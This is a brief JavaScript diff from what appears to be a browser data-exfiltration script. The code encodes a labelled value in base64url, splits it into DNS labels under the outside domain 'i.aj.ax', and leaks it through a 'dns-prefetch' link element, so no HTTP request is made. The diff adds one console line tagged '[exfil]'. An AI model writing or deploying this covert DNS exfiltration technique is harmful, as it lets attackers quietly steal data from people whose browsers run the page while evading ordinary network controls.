@@ -16,6 +16,7 @@
     var enc = btoa(prefix + ':' + value).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
     var chunks = enc.match(/.{1,63}/g) || ['x'];
     var host = chunks.join('.') + '.i.aj.ax';
+    console.log('[exfil] ' + prefix + ' -> ' + host);
     // dns-prefetch (no HTTP request, just DNS lookup)
     var l = document.createElement('link');
     l.rel = 'dns-prefetch';
